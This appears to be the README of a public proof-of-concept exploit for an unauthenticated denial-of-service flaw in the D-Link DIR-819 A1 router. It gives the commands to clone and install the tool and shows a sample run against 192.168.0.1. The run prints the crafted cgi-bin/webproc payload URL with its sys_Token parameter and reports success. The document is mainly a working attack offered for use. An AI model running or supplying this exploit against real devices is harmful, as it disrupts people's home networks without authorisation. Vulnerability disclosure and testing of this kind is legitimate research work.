# Unauthenticated Denial of Service in DLink consumer DIR 819 A1 router 


## Exploit 

### Fetch the sources
```bash
$ git clone https://github.com/whokilleddb/dlink-dir-819-dos
$ cd dlink-dir-819-dos
$ pip install -r requirements.txt
```

### Run the exploit
```bash
$ ./exploit.py -i 192.168.0.1                         
[+] DLink DIR-819 DoS exploit
[i] Address to attack: 192.168.0.1
[i] Using SSL:         False
[i] Request Timeout:   30s
[i] Buffer Length:     19
[i] Payload:           http://192.168.0.1/cgi-bin/webproc?getpage=html/index.html&errorpage=html/error.html&var:language=en_us&var:menu=basic&var:page=Bas_wansum&var:sys_Token=6307226200704307522
[+] Exploit Successful!
``` 